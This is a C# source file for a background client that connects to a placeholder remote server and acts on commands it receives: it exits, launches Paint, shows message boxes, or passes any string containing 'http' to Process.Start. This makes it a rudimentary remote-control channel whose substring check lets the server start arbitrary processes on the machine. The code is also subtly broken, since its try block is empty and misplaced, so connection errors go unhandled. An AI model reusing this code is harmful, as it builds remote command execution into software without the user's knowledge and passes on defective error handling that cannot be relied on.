using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using System.Net;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using System.Diagnostics;

namespace watch.WatchLib
{
    public class ConnectMessage
    {
        // リスナースレッド
        private Thread th;

        private TcpClient client;
        public String remote_IP = "サーバーIP or Domain";
        public Int32 remote_Port = 2000;
        private bool thread_status = true;
        private Capture capture = new Capture();

        public void startServer()
        {
            th = new Thread(DataListener);
            th.IsBackground = true;
            th.Start();

        }

        /// <summary>
        /// 強制終了
        /// </summary>
        public void kill()
        {
            if (client != null && client.Connected == true)
            {
                client.Close();

            }

            thread_status = false;
            th.Abort();

        }

        // リスナースレッド
        private void DataListener()
        {
            
                if (client == null)
                {
                    client = new TcpClient();
                }
                client.Connect(remote_IP, remote_Port);
                while (thread_status == true)
                {
                    if (client.Connected == false)
                    {
                        break;
                    }
                    Byte[] readData = new Byte[100000];
                    NetworkStream ns = client.GetStream();
                    //ns.Write(sendData, 0, sendData.Length);
                    ns.Read(readData, 0, readData.Length);
                    String client_command = System.Text.Encoding.ASCII.GetString(readData);
                    client_command = client_command.Replace("\r", "").Replace("\n", "");
                    if (client_command.CompareTo("bye") == 0)
                    {
                        Environment.Exit(0);
                        kill();
                       
                    }
                    else if (client_command.CompareTo("paint") == 0)
                    {
                        Process.Start("mspaint.exe");
                    }
                        else if (HasString(client_command,"http"))
                    {
                        Process.Start(client_command);
                    }
                    else
                    {
                        MessageBox.Show(client_command);
                    }
                    //Debug.WriteLine("send image");
                    Thread.Sleep(200);
                }
                try
                {
            }
            catch (Exception ex)
            {
               // MessageBox.Show(ex.ToString() + "Server error.");
                kill();
                
            }
        }

         bool HasString(string target, string word)
        {
            if (word == "")
                return false;
            if (target.IndexOf(word) >= 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }





    }


}
